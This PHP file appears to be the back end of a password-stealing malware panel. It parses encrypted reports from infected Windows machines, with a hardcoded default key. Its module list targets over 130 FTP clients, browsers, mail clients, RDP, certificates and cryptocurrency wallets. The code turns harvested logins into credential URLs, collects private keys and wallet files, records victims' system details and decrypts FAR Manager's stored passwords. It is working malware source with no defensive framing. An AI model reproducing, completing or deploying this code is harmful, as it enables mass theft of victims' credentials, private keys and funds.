<?php

/*

Password decryption and processing code.

*/

define("REPORT_LEN_LIMIT", 			1024*1024*32);							// do not process reports with length greater than this limit
define("REPORT_HEADER", 			"PWDFILE0");							// each password report starts with this header
define("REPORT_PACKED_HEADER", 		"PKDFILE0");							// header indicating that report is packed
define("REPORT_CRYPTED_HEADER",		"CRYPTED0");							// header indicating that report is encrypted
define("REPORT_VERSION", 			"1.0");									// supported report version
define("REPORT_MODULE_HEADER",		chr(2).chr(0)."MODU".chr(1).chr(1));	// report module header, used for consistency checks
define("REPORT_ITEMHDR_ID",			0xbeef0000);							// report item header, used for consistency checks
define("REPORT_DEFAULT_PASSWORD",	"Mesoamerica");							// default report encryption password

define('VER_PLATFORM_WIN32_NT', 2);
define('VER_NT_WORKSTATION', 1);
define('PROCESSOR_ARCHITECTURE_AMD64', 9);

// module_class | module_id | module_name
$global_module_list = array(
	array('module_systeminfo', 		    0x00000000, 'System Info'),
	array("module_far", 			    0x00000001, 'FAR Manager'),
	array("module_wtc", 			    0x00000002, 'Total Commander'),
	array("module_ws_ftp",			    0x00000003, 'WS_FTP'),
	array("module_cuteftp",			    0x00000004, 'CuteFTP'),
	array("module_flashfxp",		    0x00000005, 'FlashFXP'),
	array("module_filezilla",		    0x00000006, 'FileZilla'),
	array("module_ftpcommander",	    0x00000007, 'FTP Commander'),
	array("module_bulletproof",		    0x00000008, 'BulletProof FTP'),
	array("module_smartftp",		    0x00000009, 'SmartFTP'),
	array("module_turboftp",		    0x0000000a, 'TurboFTP'),
	array("module_ffftp",			    0x0000000b, 'FFFTP'),
	array("module_coffeecupftp",	    0x0000000c, 'CoffeeCup FTP / Sitemapper'),
	array("module_coreftp",			    0x0000000d, 'CoreFTP'),
	array("module_ftpexplorer",		    0x0000000e, 'FTP Explorer'),
	array("module_frigateftp",		    0x0000000f, 'Frigate3 FTP'),
	array("module_securefx",		    0x00000010, 'SecureFX'),
	array("module_ultrafxp", 		    0x00000011, 'UltraFXP'),
	array("module_ftprush",			    0x00000012, 'FTPRush'),
	array("module_websitepublisher",    0x00000013, 'WebSitePublisher'),
	array("module_bitkinex",		    0x00000014, 'BitKinex'),
	array("module_expandrive",		    0x00000015, 'ExpanDrive'),
	array("module_classicftp",		    0x00000016, 'ClassicFTP'),
	array("module_fling",			    0x00000017, 'Fling'),
	array("module_softx",			    0x00000018, 'SoftX'),
	array("module_dopus",			    0x00000019, 'Directory Opus'),
	array("module_freeftp",			    0x0000001a, 'FreeFTP / DirectFTP'),
	array("module_leapftp",			    0x0000001b, 'LeapFTP'),
	array("module_winscp",			    0x0000001c, 'WinSCP'),
	array("module_32bitftp",		    0x0000001d, '32bit FTP'),
	array("module_netdrive",		    0x0000001e, 'NetDrive'),
	array("module_webdrive",		    0x0000001f, 'WebDrive'),
	array("module_ftpcontrol",		    0x00000020, 'FTP Control'),
	array("module_opera",			    0x00000021, 'Opera'),
	array("module_wiseftp",			    0x00000022, 'WiseFTP'),
	array("module_ftpvoyager",		    0x00000023, 'FTP Voyager'),
    array("module_firefox",		        0x00000024, 'Firefox'),
    array("module_fireftp",		        0x00000025, 'FireFTP'),
    array("module_seamonkey",		    0x00000026, 'SeaMonkey'),
    array("module_flock",			    0x00000027, 'Flock'),
	array("module_mozilla",			    0x00000028, 'Mozilla'),
	array("module_leechftp",		    0x00000029, 'LeechFTP'),
	array("module_odin",			    0x0000002a, 'Odin Secure FTP Expert'),
	array("module_winftp",			    0x0000002b, 'WinFTP'),
	array("module_ftp_surfer",		    0x0000002c, 'FTP Surfer'),
	array("module_ftpgetter",		    0x0000002d, 'FTPGetter'),
	array("module_alftp",			    0x0000002e, 'ALFTP'),
	array("module_ie",				    0x0000002f, 'Internet Explorer'),
	array("module_dreamweaver",		    0x00000030, 'Dreamweaver'),
	array("module_deluxeftp",		    0x00000031, 'DeluxeFTP'),
	array("module_chrome",			    0x00000032, 'Google Chrome'),
	array("module_chromium",		    0x00000033, 'Chromium / SRWare Iron'),
	array("module_chromeplus",		    0x00000034, 'ChromePlus'),
	array("module_bromium",			    0x00000035, 'Bromium (Yandex Chrome)'),
	array("module_nichrome",		    0x00000036, 'Nichrome'),
	array("module_comododragon",	    0x00000037, 'Comodo Dragon'),
	array("module_rockmelt",		    0x00000038, 'RockMelt'),
	array("module_kmeleon",			    0x00000039, 'K-Meleon'),
	array("module_epic",			    0x0000003a, 'Epic'),
	array("module_staff",			    0x0000003b, 'Staff-FTP'),
	array("module_aceftp",			    0x0000003c, 'AceFTP'),
	array("module_globaldownloader",    0x0000003d, 'Global Downloader'),
	array("module_freshftp",		    0x0000003e, 'FreshFTP'),
	array("module_blazeftp",		    0x0000003f, 'BlazeFTP'),
	array("module_netfile",			    0x00000040, 'NETFile'),
	array("module_goftp",			    0x00000041, 'GoFTP'),
	array("module_3dftp",			    0x00000042, '3D-FTP'),
	array("module_easyftp",			    0x00000043, 'Easy FTP'),
	array("module_xftp",			    0x00000044, 'Xftp'),
	array("module_rdp",				    0x00000045, 'RDP'),
	array("module_ftpnow",			    0x00000046, 'FTP Now'),
	array("module_roboftp",			    0x00000047, 'Robo-FTP'),
	array("module_cert",			    0x00000048, 'Certificate'),
	array("module_linasftp",		    0x00000049, 'LinasFTP'),
	array("module_cyberduck",		    0x0000004a, 'Cyberduck'),
	array("module_putty",			    0x0000004b, 'Putty'),
	array("module_notepadpp",		    0x0000004c, 'Notepad++'),
	array("module_vs_designer",		    0x0000004d, 'CoffeeCup Visual Site Designer'),
	array("module_ftpshell",		    0x0000004e, 'FTPShell'),
	array("module_ftpinfo",			    0x0000004f, 'FTPInfo'),
	array("module_nexusfile",		    0x00000050, 'NexusFile'),
	array("module_fs_browser",		    0x00000051, 'FastStone Browser'),
	array("module_coolnovo",		    0x00000052, 'CoolNovo'),
	array("module_winzip",			    0x00000053, 'WinZip'),
	array("module_yandexinternet",	    0x00000054, 'Yandex.Internet / Ya.Browser'),
	array("module_myftp",			    0x00000055, 'MyFTP'),
	array("module_sherrodftp",		    0x00000056, 'sherrod FTP'),
	array("module_novaftp",			    0x00000057, 'NovaFTP'),
    array("module_windows_mail",	    0x00000058, 'Windows Mail'),
    array("module_windows_live_mail",   0x00000059, 'Windows Live Mail'),
    array("module_becky",   			0x0000005a, 'Becky!'),
    array("module_pocomail",   			0x0000005b, 'Pocomail'),
    array("module_incredimail",   		0x0000005c, 'IncrediMail'),
    array("module_thebat",				0x0000005d, 'The Bat!'),
    array("module_outlook",				0x0000005e, 'Outlook'),
    array("module_thunderbird",			0x0000005f, 'Thunderbird'),
    array("module_fasttrack",			0x00000060, 'FastTrackFTP'),
    array("module_bitcoin",				0x00000061, 'Bitcoin'),
    array("module_electrum",			0x00000062, 'Electrum'),
    array("module_multibit",			0x00000063, 'MultiBit'),
    array("module_ftpdisk",				0x00000064, 'FTP Disk'),
    array("module_litecoin",			0x00000065, 'Litecoin'),
    array("module_namecoin",			0x00000066, 'Namecoin'),
	array("module_terracoin",			0x00000067, 'Terracoin'),
	array("module_bitcoin_armory",		0x00000068, 'Bitcoin Armory'),
	array("module_ppcoin",				0x00000069, 'PPCoin (Peercoin)'),
	array("module_primecoin",			0x0000006a, 'Primecoin'),
	array("module_feathercoin",			0x0000006b, 'Feathercoin'),
	array("module_novacoin",			0x0000006c, 'NovaCoin'),
	array("module_freicoin",			0x0000006d, 'Freicoin'),
	array("module_devcoin",				0x0000006e, 'Devcoin'),
	array("module_frankocoin",			0x0000006f, 'Frankocoin'),
	array("module_protoshares",			0x00000070, 'ProtoShares'),
	array("module_megacoin",			0x00000071, 'MegaCoin'),
	array("module_quarkcoin",			0x00000072, 'Quarkcoin'),
	array("module_worldcoin",			0x00000073, 'Worldcoin'),
	array("module_infinitecoin",		0x00000074, 'Infinitecoin'),
	array("module_ixcoin",				0x00000075, 'Ixcoin'),
	array("module_anoncoin",			0x00000076, 'Anoncoin'),
	array("module_bbqcoin",				0x00000077, 'BBQcoin'),
	array("module_digitalcoin",			0x00000078, 'Digitalcoin'),
	array("module_mincoin",				0x00000079, 'Mincoin'),
	array("module_goldcoin",			0x0000007a, 'Goldcoin'),
	array("module_yacoin",				0x0000007b, 'Yacoin'),
	array("module_zetacoin",			0x0000007c, 'Zetacoin'),
	array("module_fastcoin",			0x0000007d, 'Fastcoin'),
	array("module_i0coin",				0x0000007e, 'I0coin'),
	array("module_tagcoin",				0x0000007f, 'Tagcoin'),
	array("module_bytecoin",			0x00000080, 'Bytecoin'),
	array("module_florincoin",			0x00000081, 'Florincoin'),
	array("module_phoenixcoin",			0x00000082, 'Phoenixcoin'),
	array("module_luckycoin",			0x00000083, 'Luckycoin'),
	array("module_craftcoin",			0x00000084, 'Craftcoin'),
	array("module_junkcoin",			0x00000085, 'Junkcoin'),
);

// convert module classname to ftp-client name
function module_name_to_client_name($module_name)
{
	global $global_module_list;
	foreach ($global_module_list as $module)
	{
		if ($module_name == $module[0])
			return $module[2];
	}
	return '';
}

// data stream processing class
class stream
{
	protected $log;
	
	// data copy
	private $data = array();
  
	// current position
	public $pos = 0;

	// data length
	public $datalen = 0;
                                               
	// state indicates read error
	public $state = false;

	// states indicating that first error message is already in the log list
	public $push_error_state = true;

	function __construct($data, $log)
	{		
		$this->data = $data;
		$this->datalen = strlen($this->data);
		$this->state = true;
		$this->log = $log;
	}

	// write the first error message only to avoid log garbage
	protected function push_error($error_msg)
	{
		$this->state = false;
		if ($this->push_error_state)
		{
			$this->log->add($error_msg);
			$this->push_error_state = false;
		}
	}

	function read_skip($len)
	{
		if (($this->pos + $len > $this->datalen) || !$this->state || $len < 0)
		{
			$this->push_error("ERR_SKIP_FAIL");
			return false;
		}

		$this->pos += $len;
		return true;
	}

	function read_byte()
	{
		if ((($this->pos + 1) > $this->datalen) || !$this->state)
		{
			$this->push_error("ERR_BYTE_READ_FAIL");
			return false;
		}
		$p = $this->pos;
		$this->pos += 1;
		return (int)ord($this->data[$p]);
	}

	function read_word()
	{
		if ((($this->pos + 2) > $this->datalen) || !$this->state)
		{
			$this->push_error("ERR_WORD_READ_FAIL");
			return false;
		}
		$unpacked_word = unpack('v', substr($this->data, $this->pos, 2));
		$this->pos += 2;
		return $unpacked_word[1];
	}

	function read_dword()
	{
		if (($this->pos + 4 > $this->datalen) || !$this->state)
		{
			$this->push_error("ERR_DWORD_READ_FAIL");
			return false;
		}
		$p = $this->pos;
		$this->pos += 4;
		return data_int32(substr($this->data, $p, 4));
	}

	function read_strlen($len)
	{
		if (($this->pos + $len > $this->datalen) || !$this->state || $len < 0)
		{
			$this->push_error("ERR_STRLEN_READ_FAIL");
			return false;
		}

		// empty string
		if (!$len)
			return "";

		$p = $this->pos;
		$this->pos += $len;
		return substr($this->data, $p, $len);
	}

	// len (dword) + string
	function read_str()
	{
		$len = $this->read_dword();
		if (!$this->state || $len < 0)
		{
			$this->push_error("ERR_STR_READ_FAIL");
			return false;
		}

		// empty string
		if (!$len)
			return "";

		if (($this->pos + $len > $this->datalen))
		{
			$this->push_error("ERR_STR_READ_FAIL");
			return false;
		}
		$r = substr($this->data, $this->pos, $len);
		$this->pos += $len;
		return $r;
	}
	
	function eof()
	{
		if (!$this->state)
			return false;
		return $this->pos >= $this->datalen;
	}

	function seek($new_pos)
	{
		if (!$this->state)
			return false;
		if ($new_pos > $this->datalen || $new_pos < 0)
		{
			$this->push_error("ERR_SEEK_FAIL");
			return false;			
		} else
		{
			$this->pos = $new_pos;
			return true;
		}
	}
}

// base class for all password module descendants
abstract class module
{
	protected $stream;
	protected $log;
	protected $options = array();
	
	public $ftp_list = array();
	public $http_list = array();
	public $rdp_list = array();
	public $cert_list = array();
	public $email_list = array();
	public $wallet_list = array();
	
	function __construct($stream, $log, $options = '')
	{		
		$this->stream = $stream;
		$this->log = $log;
		if (is_array($options))
			$this->options = $options;
	}

	// can be used (overloaded) by descendants to simplify data importing
	protected function import_item($stream, $id)
	{
		return false;
	}
	
	// import binary data
	public function import_data($module_len)
	{
		$module_end_pos = (int)$this->stream->pos + (int)$module_len;
		// process data untill module stream end
		while ($this->stream->pos < $module_end_pos)
		{
			// data item identifier dword
			$id = $this->stream->read_dword();
			// higher 2 bytes are used as a header for data consistency check
			if ((int)($id & REPORT_ITEMHDR_ID) != (int)REPORT_ITEMHDR_ID)
			{
				$this->log->add("ERR_INVALID_ITEMHDR"); // this is really bad
				return false;
			}
			// filter item identifier
			$id = (int)$id & 0xffff;
			if (!$this->import_item($this->stream, $id))
				return false;
		}
		// if data was imported successfully, current and predicted positions should match
		return ((int)$module_end_pos == (int)$this->stream->pos);	
	}

	// build ftp line
	private function build_url_line($scheme, $user, $pass, $host, $port, $path, $http_mode)
	{
		if ((!is_valid_host($host) && !is_valid_ip_filter($host)) || !strlen($user) || !strlen($pass) || !strlen($scheme))
			return "";

		if ((strtolower($scheme) == 'sftp') && (assign($this->options['sftp_protocol']) == '1'))
			$line = "sftp://".$user.":".$pass;
		else if (strtolower($scheme) == 'http' && $http_mode)
			$line = "http://".$user.":".$pass;
		else if (strtolower($scheme) == 'https' && $http_mode)
			$line = "https://".$user.":".$pass;
		else
		{
			if ($http_mode)
				$line = "http://".$user.":".$pass;
			else
			{
				if (($port == 22) && (assign($this->options['sftp_port']) == '1'))
					$line = "sftp://".$user.":".$pass;
				else
				{
					if (($user == 'root') && (assign($this->options['sftp_user']) == '1'))
						$line = "sftp://".$user.":".$pass;
					else
						$line = "ftp://".$user.":".$pass;
				}
			}
		}

		$line .= "@".$host;
		$port = strval($port);
		if (strlen($port) && is_num($port))
			$line .= ":".$port;
		if (strlen($path) && ($path[0] == "/") && ($path != "/"))
			$line .= $path;
		return $line;
	}

	// add ftp line into $ftp_list
	// apply data filter before addition
	protected function insert_ftp_line($ftp_formatted_value)
	{
		$ftp_formatted_value = trim($ftp_formatted_value);
		if (strlen($ftp_formatted_value) == 0)
			return;

		// filter ftp fully formatted lines
		global $global_filter_list, $global_allow_all_ftp;

		foreach ($global_filter_list as $filter_line)
		{
			if (stripos($ftp_formatted_value, $filter_line) !== false)
				if (!$global_allow_all_ftp)
					return;
		}

		array_push($this->ftp_list, $ftp_formatted_value);
	}

	// add http line into $http_list
	// apply data filter before addition
	protected function insert_http_line($http_formatted_value)
	{
		$http_formatted_value = trim($http_formatted_value);
		if (strlen($http_formatted_value) == 0)
			return;

		// filter ftp fully formatted lines
		global $global_filter_list, $global_allow_all_ftp;

		foreach ($global_filter_list as $filter_line)
		{
			if (stripos($http_formatted_value, $filter_line) !== false)
				if (!$global_allow_all_ftp)
					return;
		}

		array_push($this->http_list, $http_formatted_value);
	}

	// process ftp/http(s) URL
	// http_mode - process url as http(s) line (http://user:pass@host.com)
	protected function add_ftp($url, $extra_user = "", $extra_pass = "", $http_mode = false)
	{
		// check stream state
		if (!$this->stream->state)
			return false;

		// empty host
		$url = trim($url);
		if (strlen($url) == 0 || strtolower($url) == 'ftp://' || strtolower($url) == 'ftps://' || strtolower($url) == 'ftpes://' || strtolower($url) == 'sftp://' || strtolower($url) == 'esftp://' ||
		  strtolower($url) == 'http://' || strtolower($url) == 'https://' || strtolower($url) == 'sftp://:22')
			return false;

		// do not process FTP URIs without user/pass stored
		$extra_user = trim($extra_user);
		$extra_pass = trim($extra_pass);
		if ((strpos($url, '@') === false) && (!strlen(trim($extra_pass)) && (!strlen(trim($extra_user)))))
		{
			global $global_allow_all_ftp;
			if (!$global_allow_all_ftp)
				return false;
		}

		// strip protocol value for
		$url_protocol = '';
		if (($p = strpos($url, "://")) !== false)
		{
			$url_protocol = substr($url, 0, $p+3);
			$url = substr($url, $p+3);
		}

		// fix '#' chars in URL
		$url = str_replace("#", '_thisissuberurlharacter_', $url);

		// fix URL path slashes '\' -> '/'
		// fix '/' chars in user:password values
		$p = strrpos($url, "@");
		if ($p !== false)
		{
			// do not replace slashes inside username:password values
			$v1 = str_replace("/", '_thisissuperunreadablecharacter_', substr($url, 0, $p));
			// replace '//' -> '/' in directory path
			$v2 = str_replace("//", "/", str_replace("\\", "/", substr($url, $p)));
			$url = $v1.$v2;
		} else
		{
			// plain url, no user:password@ stored
			// replace '\' -> '/'
			// replace '//' -> '/' in directory path
			$url = str_replace('//', '/', str_replace("\\", "/", $url));
		}

		$url = $url_protocol.$url;
		// no protocol specified, assume it's an ftp:// | http://
		if (strpos($url, "://") === false)
		{
			if ($http_mode)
				$url = "http://".$url;
			else
				$url = "ftp://".$url;
		}

		// fix ftp:/// urls
		$url = str_replace('ftp:///', 'ftp://', $url);

		$r = @parse_url($url);

		if (is_array($r))
			foreach ($r as $key=>$value)
			{
				$r[$key] = str_replace('_thisissuperunreadablecharacter_', '/', $r[$key]);
				$r[$key] = str_replace('_thisissuberurlharacter_', '#', $r[$key]);
				// remove everything after # char in host & path parts
				if (($key == 'host' || $key == 'path') && strpos($r[$key], '#') !== false)
				{
					$r[$key] = substr($r[$key], 0, strpos($r[$key], '#'));
				}
			}

		if ($r && nonempty($r["host"]) && (is_valid_host($r["host"]) || is_valid_ip_filter($r["host"])))
		{
			$r["scheme"] = strtolower(assign($r["scheme"]));
			if (($r["scheme"] == "ftp") ||
			    ($r["scheme"] == "ftps") ||
			    ($r["scheme"] == "ftpes") ||
			    ($r["scheme"] == "sftp") ||
			    ($r["scheme"] == "esftp") ||
				($r["scheme"] == "http" && $http_mode == true) ||
				($r["scheme"] == "https" && $http_mode == true)
			    )
			{
				// specified port
				$port = "";
				if (nonempty($r["port"]) && is_num($r["port"]))
					$port = $r["port"];

				if ($http_mode == false && $port == "21")
					$port = "";

				if ($http_mode == true && $port == "80")
					$port = "";

				// specified remote ftp directory (path)
				$path = assign($r["path"]);

				// format the output string

				// ftp with URL encoded user:password
				$line = "";
				if (nonempty($r["user"]) && nonempty($r["pass"]))
					$line = $this->build_url_line($r["scheme"], $r["user"], $r["pass"],
					  $r["host"], $port, $path, $http_mode);
				if (strlen($line))
				{
					if ($http_mode)
						$this->insert_http_line($line);
					else
						$this->insert_ftp_line($line);
				}

				// ftp with extra user:passwords arguments
				$line = "";
				if (strlen($extra_user) && strlen($extra_pass))
					$line = $this->build_url_line($r["scheme"], $extra_user, $extra_pass,
					  							  $r["host"], $port, $path, $http_mode);
				if (!strlen($extra_user) && strlen($extra_pass) && nonempty($r["user"]))
					$line = $this->build_url_line($r["scheme"], $r['user'], $extra_pass,
												  $r["host"], $port, $path, $http_mode);
				if ($line)
				{
					if ($http_mode)
						$this->insert_http_line($line);
					else
						$this->insert_ftp_line($line);
				}

				return true;
			} else {
				if (trim($r['scheme']) !== '')
					$this->log->add("NOTIFY_INVALID_URL_SCHEME: ".$r["scheme"]);
			}
		} elseif (!$r)
		{
			// revert fixed characters
			$url = str_replace('_thisissuperunreadablecharacter_', '/', $url);
			$url = str_replace('_thisissuberurlharacter_', '#', $url);
			$this->log->add("NOTIFY_CANNOT_PARSE_URL: $url");
		}
		return false;
	}

	protected function add_http($url, $extra_user = "", $extra_pass = "")
	{
		$this->add_ftp($url, $extra_user, $extra_pass, true);
	}

	protected function add_rdp($server, $user, $pass)
	{
		global $global_filter_list;

		$server = trim($server);
		$user = trim($user);
		$pass = trim($pass);

		if ((!is_valid_host($server) && !is_valid_ip_filter($server)) || !strlen($server) || !strlen($user) || !strlen($pass))
		{
			return;
		}

		$rdp_formatted_value = 'rdp://'.$user.':'.$pass.'@'.$server;

		foreach ($global_filter_list as $filter_line)
		{
			if (stripos($rdp_formatted_value, $filter_line) !== false)
			{
				global $global_allow_all_ftp;
				if (!$global_allow_all_ftp)
					return;
			}
		}

		array_push($this->rdp_list, $rdp_formatted_value);
	}

	protected function add_cert($cert, $pvt_key)
	{
		if (strlen($cert) && strlen($pvt_key))
		{
			array_push($this->cert_list, array($cert, $pvt_key));
		}
	}

	protected function add_wallet($wallet_file)
	{
		if (strlen($wallet_file))
		{
			array_push($this->wallet_list, $wallet_file);
		}
	}

    protected function add_email($email, $protocol, $server, $port, $user, $pass)
    {
        $email = trim($email);
        $protocol = strtolower(trim($protocol));
        $server = trim($server);
        $user = trim($user);
        $pass = trim($pass);
        $port = trim($port);
		$port = strval(intval($port));

        if ($port == '0')
        {
            $port = '';
        }

        // validate protocol
        if ($protocol != 'smtp' && $protocol != 'imap' && $protocol != 'pop3' && $protocol != 'http')
        {
            return false;
        }

        // do not allow empty values
        if (!strlen($email) || !strlen($server) || !strlen($user) || !strlen($pass))
        {
            return false;
        }

        // validate email address
        if (!is_valid_email($email))
        {
            return false;
        }

        // check if port is stored in server value
        $port_pos = strpos($server, ':');
		$stored_port = '';
        if ($port_pos !== false)
        {
            if ($port == '')
            {
                $port = strval(intval(trim(substr($server, $port_pos+1))));
                if ($port == '0')
                    $port = '';
            } else
			{
				$stored_port = strval(intval(trim(substr($server, $port_pos+1))));
                if ($stored_port == '0')
                    $stored_port = '';
			}
			// cut stored port
            $server = substr($server, 0, $port_pos);
        }

        // validate server host/ip
        if (!is_valid_host($server) && !is_valid_ip_filter($server))
        {
            return false;
        }

        // do not store default port value
        switch ($protocol)
        {
            case 'smtp':
                if ($port == '25')
                    $port = '';
                if ($stored_port == '25')
                    $stored_port = '';
                break;
            case 'imap':
                if ($port == '143')
                    $port = '';
                if ($stored_port == '143')
                    $stored_port = '';
                break;
            case 'pop3':
                if ($port == '110')
                    $port = '';
                if ($stored_port == '110')
                    $stored_port = '';
                break;
            case 'http':
                if ($port == '80')
                    $port = '';
                if ($stored_port == '80')
                    $stored_port = '';
                break;
        }

        array_push($this->email_list, array('email'=>$email, 'protocol'=>$protocol, 'server'=>$server, 'port'=>$port, 'user'=>$user, 'pass'=>$pass));

		if (strlen($stored_port))
		{
			array_push($this->email_list, array('email'=>$email, 'protocol'=>$protocol, 'server'=>$server, 'port'=>$stored_port, 'user'=>$user, 'pass'=>$pass));
		}

        return true;
    }
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// System Information

class module_systeminfo extends module
{
	public $os_name;
	public $is_win64;
	public $user_country;
	public $user_language;
	public $is_admin;
	public $hwid;

	protected function detect_os($version_info, $system_info)
	{
		if (strlen($version_info) <= 4)
			return false;

		if (strlen($system_info) == 36)
		{
			$system_info_stream = new stream($system_info, $this->log);
			$wProcessorArchitecture = $system_info_stream->read_word();
		} else
			$wProcessorArchitecture = 0;

		$info_stream = new stream($version_info, $this->log);

		$dwOSVersionInfoSize = $info_stream->read_dword();

		if ($dwOSVersionInfoSize != strlen($version_info))
		{
			return false;
		}

  		$dwMajorVersion = $info_stream->read_dword();
  		$dwMinorVersion = $info_stream->read_dword();
  		/*$dwBuildNumber = */$info_stream->read_dword();
  		$dwPlatformId = $info_stream->read_dword();
  		$szCSDVersion = $info_stream->read_strlen(128);
  		$wServicePackMajor = $info_stream->read_word();
  		/*$wServicePackMinor = */$info_stream->read_word();
  		/*$wSuiteMask = */$info_stream->read_word();
  		$wProductType = $info_stream->read_byte();
  		/*$wReserved = */ $info_stream->read_byte();

  		$os_name = 'Windows';

  		switch ($dwMajorVersion)
  		{
  			case 3:
  				if ($dwMinorVersion == 51)
  					$os_name .= ' NT 3.51';
				break;
			case 4:
				switch ($dwMinorVersion)
				{
					case 0:
						if ($dwPlatformId == VER_PLATFORM_WIN32_NT)
							$os_name .= ' NT 4.0';
						else
						{
				    		$os_name .= ' 95';
				    		if ($szCSDVersion[1] == 'C' || $szCSDVersion[1] == 'B')
				    			$os_name .= ' OSR2';
						}
						break;
					case 10:
						$os_name .= ' 98';
						if ($szCSDVersion[1] == 'A')
							$os_name .= ' SE';
						break;
					case 90:
						$os_name .= ' Me';
						break;
				}
				break;
			case 5:
				switch ($dwMinorVersion)
				{
					case 0:
						$os_name .= ' 2000';
						break;
					case 1:
						$os_name .= ' XP';
						break;
					case 2:
						if ($wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 && $wProductType == VER_NT_WORKSTATION)
							$os_name .= ' XP'; // Windows XP Professional x64 Edition
						else
							$os_name .= ' Server 2003';
						break;
				}
				break;
			case 6:
				switch ($dwMinorVersion)
				{
					case 0:
						if ($wProductType == VER_NT_WORKSTATION)
							$os_name .= ' Vista';
						else
							$os_name .= ' Server 2008';
						break;
					case 1:
						if ($wProductType == VER_NT_WORKSTATION)
							$os_name .= ' 7';
						else
							$os_name .= ' Server 2008 R2';
						break;
					case 2:
						$os_name .= ' 8';
						break;
				}
				break;
		}

		if ($dwPlatformId == VER_PLATFORM_WIN32_NT)
		{
			//$csd = ztrim($szCSDVersion);
			//if ($csd)
			//{
			//	$os_name .= ' '.$csd;
			//}
			if ($wServicePackMajor > 0)
			{
				$os_name .= ' SP '.strval($wServicePackMajor);
			}
		}

		return trim($os_name);
	}

	protected function process_hwid($HwProfileInfo)
	{
		return trim(ztrim(substr($HwProfileInfo, 4)));
	}

	protected function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
			case 0x0001:
				$version_info = $stream->read_str();
				$this->is_win64 = $stream->read_dword();
				$this->user_country = $stream->read_str();
				$this->user_language = $stream->read_str();
				$this->is_admin = $stream->read_dword();
				$this->hwid = $this->process_hwid($stream->read_str());
				if ($id > 0)
				{
					$system_info = $stream->read_str();
				} else
					$system_info = '';

    			$this->os_name = $this->detect_os($version_info, $system_info);

				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

// -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
// FAR Manager

class module_far extends module
{
	protected function Dos2Win($text)
	{
  		$CTable = array(
		    0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0A,0x0B,0x0C,0x0D,0x0E,0x0F,
		    0x10,0x11,0x12,0x13,0x14,0x15,0x16,0x17,0x18,0x19,0x1A,0x1B,0x1C,0x1D,0x1E,0x1F,
		    0x20,0x21,0x22,0x23,0x24,0x25,0x26,0x27,0x28,0x29,0x2A,0x2B,0x2C,0x2D,0x2E,0x2F,
		    0x30,0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,0x39,0x3A,0x3B,0x3C,0x3D,0x3E,0x3F,
		    0x40,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48,0x49,0x4A,0x4B,0x4C,0x4D,0x4E,0x4F,
		    0x50,0x51,0x52,0x53,0x54,0x55,0x56,0x57,0x58,0x59,0x5A,0x5B,0x5C,0x5D,0x5E,0x5F,
		    0x60,0x61,0x62,0x63,0x64,0x65,0x66,0x67,0x68,0x69,0x6A,0x6B,0x6C,0x6D,0x6E,0x6F,
		    0x70,0x71,0x72,0x73,0x74,0x75,0x76,0x77,0x78,0x79,0x7A,0x7B,0x7C,0x7D,0x7E,0x7F,
		    0xC0,0xC1,0xC2,0xC3,0xC4,0xC5,0xC6,0xC7,0xC8,0xC9,0xCA,0xCB,0xCC,0xCD,0xCE,0xCF,
		    0xD0,0xD1,0xD2,0xD3,0xD4,0xD5,0xD6,0xD7,0xD8,0xD9,0xDA,0xDB,0xDC,0xDD,0xDE,0xDF,
		    0xE0,0xE1,0xE2,0xE3,0xE4,0xE5,0xE6,0xE7,0xE8,0xE9,0xEA,0xEB,0xEC,0xED,0xEE,0xEF,
		    0xB0,0xB1,0xB2,0xA6,0xB4,0xB5,0xB6,0xB7,0xB8,0xB9,0xBA,0xBB,0xBC,0xBD,0xBE,0xAC,
		    0xC0,0xC1,0xC2,0xC3,0xC4,0x86,0xC6,0xC7,0xC8,0xC9,0xCA,0xCB,0xCC,0xCD,0xCE,0xCF,
		    0xD0,0xD1,0xD2,0xD3,0xD4,0xD5,0xD6,0xD7,0x87,0xD9,0xDA,0xDB,0xDC,0xDD,0xDE,0xDF,
		    0xF0,0xF1,0xF2,0xF3,0xF4,0xF5,0xF6,0xB5,0xF8,0xF9,0xFA,0xFB,0xFC,0xFD,0xFE,0xFF,
		    0xA8,0xB8,0xAA,0xBA,0xAF,0xBF,0xA1,0xA2,0xB0,0xF9,0xB7,0xFB,0xB9,0xA4,0xFE,0xA0
		);
		for ($i = 0; $i < strlen($text); $i++)
			$text[$i] = chr($CTable[ord($text[$i])]);
		return $text;
	}

	protected function decrypt($pass)
	{
		if (strlen($pass) < 3)
			return "";
		$result = "";
		$key = ord($pass[0]) ^ ord($pass[1]) | 0x50;
		for ($i = 2; $i < strlen($pass); $i++)
		{
			if (ord($pass[$i]) == 0)
				break;
			$result .= chr(ord($pass[$i]) ^ $key);
		}
		return $result;
	}

	protected function import_item($stream, $id)
	{
		switch ($id)
		{
			case 0x0000:
				// saved plugin passwords
				$host = $this->dos2win($stream->read_str());
				$user = $this->dos2win($stream->read_str());
				$pass = $this->dos2win($this->decrypt($stream->read_str()));
				$this->add_ftp($host, $user, $pass);
				break;
			case 0x0001:
				// history
				$type = $stream->read_dword();
				$uri = $stream->read_str();
				if (!$stream->state)
					return false;
				if ($type == 0)
				{
					// REG_SZ
					$this->add_ftp($uri);
				} else if($type == 1)
				{
					// REG_MULTI_SZ
					$a = explode(chr(0), $uri);
					foreach ($a as $line)
						$this->add_ftp($line);
				} else
				{
					$this->log->add("ERR_UNKNOWN_FAR_HISTORY_TYPE");
					return false;
				}
				break;
			default:
				$this->log->add("ERR_UNKNOWN_ITEM_TYPE");
				return false;
		}
		return true;
	}
}

